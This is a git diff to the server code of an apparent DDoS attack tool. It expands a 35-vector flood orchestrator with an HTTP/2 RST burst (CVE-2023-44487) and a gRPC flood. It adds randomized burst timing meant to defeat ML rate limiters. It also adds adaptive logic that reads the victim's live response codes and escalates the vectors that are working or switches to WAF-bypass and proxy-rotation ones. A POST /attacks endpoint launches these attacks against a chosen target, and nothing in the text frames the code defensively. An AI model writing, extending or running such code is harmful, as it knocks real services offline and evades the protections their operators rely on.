@@ -338,7 +338,7 @@ const HTTP_PROXY_METHODS = new Set([
   "http-smuggling", "doh-flood", "keepalive-exhaust",
   "app-smart-flood", "large-header-bomb", "http2-priority-storm",
   // Geass vectors — must rotate via proxy to bypass Cloudflare IP filtering
-  "geass-override", "cf-bypass", "nginx-killer", "h2-rst-burst",
+  "geass-override", "cf-bypass", "nginx-killer", "h2-rst-burst", "grpc-flood",
   "h2-storm", "pipeline-flood", "conn-flood", "slowloris",
 ]);
 
@@ -416,6 +416,7 @@ function spawnPool(
 async function runAttackWorkers(
   method: string, target: string, port: number, threads: number,
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
+  id?: number, // optional — needed by Geass Override T004 adaptive burst
 ): Promise<void> {
   // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
   // quic-flood is also UDP-based (port 443/UDP)
@@ -487,7 +488,7 @@ async function runAttackWorkers(
     const h2W      = Math.max(6, CPU_COUNT);          // ≥6 — CVE-2023-44487 (stateless, scales well)
     const contW    = Math.max(4, Math.floor(CPU_COUNT * 0.75)); // ≥4 — CVE-2024-27316 OOM
     const hpackW   = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — HPACK eviction
-    const wafW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Chrome fingerprint
+    const wafW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Chrome JA4 fingerprint
     const wsW      = 1;                               // 1× WS exhaust (5K persistent WS sockets each)
     const gqlW     = 2;                               // 2× GraphQL exponential
     const rudyW    = 1;                               // 1× multipart slow POST (persistent)
@@ -507,12 +508,14 @@ async function runAttackWorkers(
     const appW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — App Smart Flood
     const lhbW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Large Header Bomb
     const prioW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PRIORITY Storm
+    const rstW     = Math.max(4, CPU_COUNT);          // ≥4 — H2 RST Burst (CVE-2023-44487 pure)
+    const grpcW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — gRPC handler exhaustion
     const synW     = 1;                               // 1× SYN flood (UDP-like, 1 is enough)
     // L3/UDP — single worker with high socket concurrency
     const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
     const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;
 
-    // ── Thread budget v2 — re-calibrated April 2026 ─────────────────────────
+    // ── Thread budget v3 — re-calibrated April 2026 (35 vectors) ────────────
     // Priority: H2 RST (CVE-2023-44487) → H2 Settings Storm → HTTP Pipeline
     // → HPACK Bomb → H2 CONTINUATION (CVE-2024-27316) → WAF Bypass → App Smart
     const connT    = Math.max(200,  Math.round(threads * 0.10)); // conn-flood (hold sockets)
@@ -520,7 +523,7 @@ async function runAttackWorkers(
     const h2T      = Math.max(1200, Math.round(threads * 0.70)); // ★★★★ CVE-2023-44487 RST — most impactful
     const contT    = Math.max(900,  Math.round(threads * 0.50)); // ★★★ CVE-2024-27316 OOM — many servers unpatched
     const hpackT   = Math.max(700,  Math.round(threads * 0.40)); // ★★★ HPACK eviction CPU storm
-    const wafT     = Math.max(600,  Math.round(threads * 0.40)); // ★★★ Chrome fingerprint bypass
+    const wafT     = Math.max(600,  Math.round(threads * 0.40)); // ★★★ Chrome JA4 fingerprint bypass
     const wsT      = Math.max(200,  Math.round(threads * 0.10)); // WS goroutine exhaust
     const gqlT     = Math.max(100,  Math.round(threads * 0.07)); // GraphQL resolver explosion
     const udpT     = Math.max(150,  Math.round(threads * 0.08)); // UDP bandwidth
@@ -549,6 +552,8 @@ async function runAttackWorkers(
     const appT     = Math.max(600,  Math.round(threads * 0.35)); // ★★★ App Smart Flood (session-aware)
     const lhbT     = Math.max(500,  Math.round(threads * 0.28)); // ★★★ Large Header Bomb (header table OOM)
     const prioT    = Math.max(400,  Math.round(threads * 0.28)); // ★★★ H2 PRIORITY Storm (dep-tree CPU)
+    const rstT     = Math.max(800,  Math.round(threads * 0.55)); // ★★★★ H2 RST Burst — pure CVE-2023-44487
+    const grpcT    = Math.max(300,  Math.round(threads * 0.20)); // ★★★ gRPC flood — separate thread pool
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -561,7 +566,7 @@ async function runAttackWorkers(
       }
     };
 
-    // ── Launch all 33 vectors simultaneously (ARES OMNIVECT ∞) ──────────────────
+    // ── Launch all 35 vectors simultaneously (ARES OMNIVECT ∞ v2) ────────────────
     const geassPromise = Promise.all([
       // L7 Application (12 vectors)
       spawnPool("conn-flood",          target, port, connT,   connW,   signal, makeGeassOnStats("conn")),
@@ -576,11 +581,13 @@ async function runAttackWorkers(
       spawnPool("cache-poison",        target, port, cacheT,  cacheW,  signal, onStats),
       spawnPool("http-bypass",         target, port, bypassT, bypassW, signal, onStats),
       spawnPool("keepalive-exhaust",   target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),
-      // L7 Advanced H2 (4 vectors)
+      // L7 Advanced H2 (6 vectors — +h2-rst-burst, +grpc-flood)
       spawnPool("h2-settings-storm",   target, port, stormT,  stormW,  signal, onStats),
       spawnPool("http-pipeline",       target, port, pipeT,   pipeW,   signal, onStats),
       spawnPool("h2-ping-storm",       target, port, pingT,   pingW,   signal, onStats),
       spawnPool("http-smuggling",      target, port, smugT,   smugW,   signal, onStats),
+      spawnPool("h2-rst-burst",        target, port, rstT,    rstW,    signal, onStats),               // [NEW 35] CVE-2023-44487 pure RST engine
+      spawnPool("grpc-flood",          target, port, grpcT,   grpcW,   signal, onStats),               // [NEW 36] gRPC handler pool exhaustion
       // TLS / Crypto (3 vectors)
       spawnPool("tls-renego",          target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),
       spawnPool("ssl-death",           target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),
@@ -589,10 +596,10 @@ async function runAttackWorkers(
       spawnPool("xml-bomb",            target, port, xmlT,    xmlW,    signal, onStats),
       spawnPool("slow-read",           target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),
       spawnPool("range-flood",         target, port, rangeT,  rangeW,  signal, onStats),
-      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),                // [NEW 23]
-      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),               // [NEW 24]
+      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),
+      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),
       // L7 H2 Priority (1 vector)
-      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),               // [NEW 25]
+      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),
       // L4 Transport (1 vector)
       spawnPool("syn-flood",           target, port, synT,    synW,    signal, onStats),
       // L3 Network (5 vectors)
@@ -604,28 +611,62 @@ async function runAttackWorkers(
       // UDP / Volumetric (2 vectors)
       spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),
       spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),
-    ]); // Total: 33 ARES OMNIVECT ∞ vectors
+    ]); // Total: 35 ARES OMNIVECT ∞ v2 vectors (+h2-rst-burst, +grpc-flood)
 
-    // ── ADAPTIVE BURST MODE ─────────────────────────────────────────────
-    // After 30s: fires BURST WAVES alternating between H2/Pipeline-heavy and
-    // App-layer-heavy waves — 15s on, 15s off, indefinitely.
-    // Wave pattern: odd=H2 heavy (+80%), even=App heavy (+60%), 3rd=Max (+120%)
-    // This overwhelms rate limiters tuned for steady-state traffic.
+    // ── ADAPTIVE BURST MODE v2 — T003 RESPONSE CODE INTELLIGENCE ────────────
+    // After 30s: fires BURST WAVES with randomized duration (8-22s ON, 3-10s REST).
+    // Uniform burst timing is detectable by ML rate limiters — irregular cadence defeats them.
+    //
+    // T004 ADAPTIVE LOGIC: reads live response codes from the T003 telemetry map to
+    // dynamically select which vectors to boost in each wave:
+    //   • 5xx dominant (>35% of total) → server is overwhelmed → boost H2/RST vectors
+    //   • 429 dominant (>25% of client) → rate-limited → boost gRPC + proxy-rotation vectors
+    //   • Mixed/unknown → standard wave rotation (H2 → App → Max)
+    const ri = (min: number, max: number) => Math.floor(Math.random() * (max - min)) + min;
     const burstLoop = async () => {
-      await new Promise<void>(r => setTimeout(r, 30_000)); // wait 30s for target to be probed
+      await new Promise<void>(r => setTimeout(r, 30_000)); // wait 30s for initial probing
       let wave = 0;
       while (!signal.aborted) {
         wave++;
+        const onMs   = ri(8_000,  22_000); // ★ random 8-22s burst window (defeats fixed-pattern detection)
+        const restMs = ri(3_000,  10_000); // ★ random 3-10s rest between bursts
         const burstAbort = new AbortController();
-        const burstTimer = setTimeout(() => burstAbort.abort(), 15_000);
+        const burstTimer = setTimeout(() => burstAbort.abort(), onMs);
         const combined: AbortSignal = typeof (AbortSignal as { any?: unknown }).any === "function"
           ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, burstAbort.signal])
           : burstAbort.signal;
 
-        if (wave % 3 === 0) {
-          // ★ MAX DEVASTATION wave — all top vectors at 2.5× (every 3rd wave) — v3 +25%
+        // T004: Read real-time response code distribution to select wave strategy
+        const codes  = liveResponseCodes.get(id ?? -1) ?? { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
+        const total  = codes.ok + codes.redir + codes.client + codes.server + codes.timeout;
+        const svRat  = total > 0 ? codes.server / total : 0;  // 5xx ratio
+        const ratRat = total > 0 ? codes.client / (total || 1) : 0; // 4xx ratio (includes 429)
+
+        if (svRat > 0.35) {
+          // ★ SERVER OVERWHELMED (5xx > 35%) — double-down on H2 + RST to finish the job
+          void Promise.all([
+            spawnPool("http2-flood",      target, port, Math.round(h2T    * 3.0), Math.min(h2W, 10),    combined, onStats),
+            spawnPool("h2-rst-burst",     target, port, Math.round(rstT   * 3.0), Math.min(rstW, 10),   combined, onStats),
+            spawnPool("h2-settings-storm",target, port, Math.round(stormT * 2.8), Math.min(stormW, 8),  combined, onStats),
+            spawnPool("http-pipeline",    target, port, Math.round(pipeT  * 2.8), Math.min(pipeW, 8),   combined, onStats),
+            spawnPool("h2-ping-storm",    target, port, Math.round(pingT  * 2.5), Math.min(pingW, 6),   combined, onStats),
+            spawnPool("hpack-bomb",       target, port, Math.round(hpackT * 2.5), Math.min(hpackW, 6),  combined, onStats),
+          ]).finally(() => clearTimeout(burstTimer));
+        } else if (ratRat > 0.25) {
+          // ★ RATE LIMITED (4xx > 25%) — switch to gRPC + WAF bypass (different rate limit pools)
+          void Promise.all([
+            spawnPool("grpc-flood",       target, port, Math.round(grpcT  * 3.0), Math.min(grpcW, 8),   combined, onStats),
+            spawnPool("waf-bypass",       target, port, Math.round(wafT   * 2.5), Math.min(wafW, 6),    combined, onStats),
+            spawnPool("http-bypass",      target, port, Math.round(bypassT* 2.5), Math.min(bypassW, 6), combined, onStats),
+            spawnPool("cache-poison",     target, port, Math.round(cacheT * 2.0), Math.min(cacheW, 4),  combined, onStats),
+            spawnPool("graphql-dos",      target, port, Math.round(gqlT   * 2.0), Math.min(gqlW, 4),    combined, onStats),
+            spawnPool("app-smart-flood",  target, port, Math.round(appT   * 2.0), Math.min(appW, 6),    combined, onStats),
+          ]).finally(() => clearTimeout(burstTimer));
+        } else if (wave % 3 === 0) {
+          // ★ MAX DEVASTATION wave — all top vectors at 2.5× (every 3rd wave)
           void Promise.all([
             spawnPool("http2-flood",        target, port, Math.round(h2T    * 2.5), Math.min(h2W, 8),    combined, onStats),
+            spawnPool("h2-rst-burst",       target, port, Math.round(rstT   * 2.5), Math.min(rstW, 8),   combined, onStats),
             spawnPool("http-pipeline",      target, port, Math.round(pipeT  * 2.5), Math.min(pipeW, 8),  combined, onStats),
             spawnPool("h2-settings-storm",  target, port, Math.round(stormT * 2.5), Math.min(stormW, 8), combined, onStats),
             spawnPool("app-smart-flood",    target, port, Math.round(appT   * 2.5), Math.min(appW, 8),   combined, onStats),
@@ -633,9 +674,10 @@ async function runAttackWorkers(
             spawnPool("h2-ping-storm",      target, port, Math.round(pingT  * 2.5), Math.min(pingW, 4),  combined, onStats),
             spawnPool("waf-bypass",         target, port, Math.round(wafT   * 2.0), Math.min(wafW, 4),   combined, onStats),
             spawnPool("hpack-bomb",         target, port, Math.round(hpackT * 2.0), Math.min(hpackW, 4), combined, onStats),
+            spawnPool("grpc-flood",         target, port, Math.round(grpcT  * 2.0), Math.min(grpcW, 4),  combined, onStats),
           ]).finally(() => clearTimeout(burstTimer));
         } else if (wave % 2 === 0) {
-          // ★ App/TLS heavy wave — DB + crypto exhaustion (2.2× — was 1.8×)
+          // ★ App/TLS heavy wave — DB + crypto exhaustion (2.2×)
           void Promise.all([
             spawnPool("app-smart-flood",      target, port, Math.round(appT  * 2.2), Math.min(appW, 8),  combined, onStats),
             spawnPool("large-header-bomb",    target, port, Math.round(lhbT  * 2.2), Math.min(lhbW, 8), combined, onStats),
@@ -644,11 +686,13 @@ async function runAttackWorkers(
             spawnPool("http-smuggling",       target, port, Math.round(smugT * 2.2), Math.min(smugW, 4), combined, onStats),
             spawnPool("tls-renego",           target, port, Math.round(tlsT  * 2.0), Math.min(tlsW, 4),  combined, onStats),
             spawnPool("ssl-death",            target, port, Math.round(sslT  * 2.0), Math.min(sslW, 4),  combined, onStats),
+            spawnPool("grpc-flood",           target, port, Math.round(grpcT * 2.0), Math.min(grpcW, 4), combined, onStats),
           ]).finally(() => clearTimeout(burstTimer));
         } else {
-          // ★ H2/Protocol heavy wave — bandwidth + H2 state exhaustion (2.0× — was 1.6×)
+          // ★ H2/Protocol heavy wave — bandwidth + H2 state exhaustion (2.0×)
           void Promise.all([
             spawnPool("http2-flood",       target, port, Math.round(h2T    * 2.0), Math.min(h2W, 8),    combined, onStats),
+            spawnPool("h2-rst-burst",      target, port, Math.round(rstT   * 2.0), Math.min(rstW, 8),   combined, onStats),
             spawnPool("http-pipeline",     target, port, Math.round(pipeT  * 2.0), Math.min(pipeW, 8),  combined, onStats),
             spawnPool("h2-settings-storm", target, port, Math.round(stormT * 2.0), Math.min(stormW, 8), combined, onStats),
             spawnPool("http2-continuation",target, port, Math.round(contT  * 2.0), Math.min(contW, 8),  combined, onStats),
@@ -656,8 +700,8 @@ async function runAttackWorkers(
             spawnPool("http2-priority-storm",target,port, Math.round(prioT * 1.8), Math.min(prioW, 4),  combined, onStats),
           ]).finally(() => clearTimeout(burstTimer));
         }
-        // 15s rest between waves
-        await new Promise<void>(r => setTimeout(r, 15_000));
+        // ★ Random rest duration — defeats steady-state traffic analysis
+        await new Promise<void>(r => setTimeout(r, restMs));
       }
     };
     void burstLoop();
@@ -716,7 +760,8 @@ router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
   }
 
   void runAttackWorkers(method, target, port, threads, ctrl.signal,
-    (pkts, bytes, conns) => onWorkerStats(id, pkts, bytes, conns)
+    (pkts, bytes, conns) => onWorkerStats(id, pkts, bytes, conns),
+    id, // T004: pass attack id so Geass Override burst loop can read response codes
   ).finally(async () => {
     // Final flush of any pending batch stats
     const pending = dbBatchPkts.get(id) ?? 0;
